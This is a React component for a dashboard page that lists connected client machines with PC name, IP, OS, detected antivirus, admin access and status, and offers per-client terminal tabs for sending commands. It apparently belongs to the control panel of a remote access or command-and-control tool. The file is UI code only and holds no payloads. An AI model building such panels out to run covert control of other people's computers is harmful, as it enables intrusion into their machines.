import React, { useState } from 'react'
import { Search, Terminal ,Edit} from 'lucide-react';
import ClientTab from '../components/ClientTab';
import useFetch from '../hooks/useFetch';
import { ClientDetail } from '../components/ClientDetail';
import EditUsers from '../components/EditUsers';
import CommandResponse from '../components/CommandResponse';

function Clients() {
    const users =useFetch('http://localhost/api/clients/',["http://localhost/api/clients/"])||[];
    const [editUser, setEditUser] = useState(null);
    const [responseModal, setResponseModal] = useState(null);
    const [searchUsers, setSearchUsers] = useState('');

    const [tabs, setTabs] = useState([]);
    const [acticeTab, setActiveTab] = useState(null);
    const [userLogs , setUserLogs]= useState(null);
    
    const addUserLogs = (tabId,color='green', alert='SUCCESS',message="Something") => {
        if (userLogs == null){
            setUserLogs({[tabId]:[{color, alert, message}]});
        }
        else{
            setUserLogs((prevLogs) => {
                return {
                    ...prevLogs,
                    [tabId]: [...(prevLogs[tabId] || []), {color, alert, message}]
                };
            });
        }
    }
    
    const addTab =(id, user, ip, )=>{
        let data = {id, user, ip}
        setActiveTab(id);
        if(tabs.some(obj=>obj.id == id)) return;
        setTabs((prevTab)=>{
            return [...prevTab, data];
        })
    }

    const deleteTab = (id) => {
        setTabs((prevTab) => prevTab.filter(tab=>tab.id !=id));
        if(acticeTab === id) {
            const remainingTabs = tabs.filter(tab => tab.id !== id);
            setActiveTab(remainingTabs.length > 0 ? tabs[0].id : null);
        }
    }
    const handelEditUser = (id=null, pcname=null, computer=null, antivirus=null)=>{
        if (id){
            setEditUser({id, pcname, computer, antivirus});
            return;
        }
        setEditUser(null);
    }

    
    const handleResponseModal =(id=null)=>{
        setResponseModal(id);
    }

    const filterUsers = users.filter(user => {
        let name = user.pcname || '';
        let pcName = user.pcName || '';
        return name.toLocaleLowerCase().includes(searchUsers.toLocaleLowerCase()) ||
            pcName.toLocaleLowerCase().includes(searchUsers.toLocaleLowerCase());
    });

    return (<>
           {editUser && <EditUsers id={editUser.id}  pcname={editUser.pcname} computer={editUser.computer} antivirus={editUser.antivirus} handelEditUser={handelEditUser} />}
            {responseModal && <CommandResponse id ={responseModal} handleResponseModal={handleResponseModal} ></CommandResponse>}
            <div className="p-6 space-y-6 relative">
                {/* search clients */}
                <div className='flex items-center gap-4'>
                    <div className='relative flex-1 max-w-md'>
                        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                        <input type="text"
                            placeholder="Search users..."
                            value={searchUsers}
                            onChange={(e) => setSearchUsers(e.target.value)}
                            className="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        >
                        </input>
                    </div>
                </div>
                {/* end search clients */}

                {/* client list table */}
                <div className='bg-white rounded-xl shadow-sm border border-gray-200 resize overflow-x-auto' style={{maxHeight:"40vh"}}>
                    <div className="overflow-x-auto ">
                        <table className="w-full">
                            <thead className="bg-gray-50 border-b border-gray-200">
                                <tr>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">PC Name</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">IP</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">OS</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">Detected Antivirus</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">Access</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">Status</th>
                                    <th className="text-left py-1 px-2 font-medium text-gray-900">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-200">
                                {filterUsers.map((user) => {
                                    return (
                                        <tr key={user.id} className="hover:bg-gray-50 transition-colors">
                                            <td className="py-1 px-2">
                                                <div className="flex items-center gap-3">
                                                    <img src={`https://flaglog.com/codes/standardized-rectangle-120px/${user.location}.png`} alt={user.pcname} 
                                                        className="w-5 h-5 rounded-full object-cover"/>
                                                    <div>
                                                        <p className="font-medium text-gray-900">{user.pcname}</p>
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="py-1 px-2 text-gray-600">{user.ip}</td>
                                            <td className="py-1 px-2 text-gray-600">{user.computer}</td>
                                            <td className="py-1 px-2 text-gray-600">{user.antivirus}</td>
                                            <td className='py-1 px-2 text-gray-600'>
                                                <span  className={`px-2 py-1 rounded-full text-xs font-medium 
                                                    ${user.access=='Admin'?'bg-purple-100 text-purple-800':'bg-purple-100 text-red-800'}`
                                                    }>
                                                        {user.access}
                                                </span>
                                            </td>
                                            <td className='py-1 px-2 text-gray-600'>
                                                <span className={`px-2 py-1 rounded-full text-xs font-medium 
                                                    ${user.status=='active'?'bg-green-100 text-green-800':'bg-red-100 text-red-800'}`
                                                    }>
                                                        {user.status}
                                                </span>
                                            </td>
                                            <td className='py-1 px-2 text-gray-600'>
                                                <div className="flex items-center gap-2">
                                                    <button className="p-1 text-gray-600 hover:text-blue-600 transition-colors cursor-pointer" 
                                                    onClick={()=>{
                                                        addTab(user.id, user.pcname, user.ip);
                                                    }}
                                                    >
                                                        <Terminal className="w-5 h-5" />
                                                    </button>
                                                    <button className="p-1 text-gray-600 hover:text-blue-600 transition-colors cursor-pointer" 
                                                    onClick={()=>{
                                                        handelEditUser(user.id, user.pcname, user.computer, user.antivirus);
                                                    }}
                                                    >
                                                        <Edit className="w-4 h-4" />
                                                    </button>
                                                </div>
                                            </td>
                                        </tr>
                                    )
                                })}
                            </tbody>
                        </table>
                    </div>
                </div>
                {/* client list table ends */}

            </div>
            <ClientTab 
                        tabs={tabs} 
                        acticeTab={acticeTab}
                        setActiveTab= {setActiveTab} 
                        deleteTab={deleteTab}
                        userLogs={userLogs}
                        addUserLogs={addUserLogs}
                        handleResponseModal={handleResponseModal}
            >

            </ClientTab>
        </>
    )
}

export default Clients;
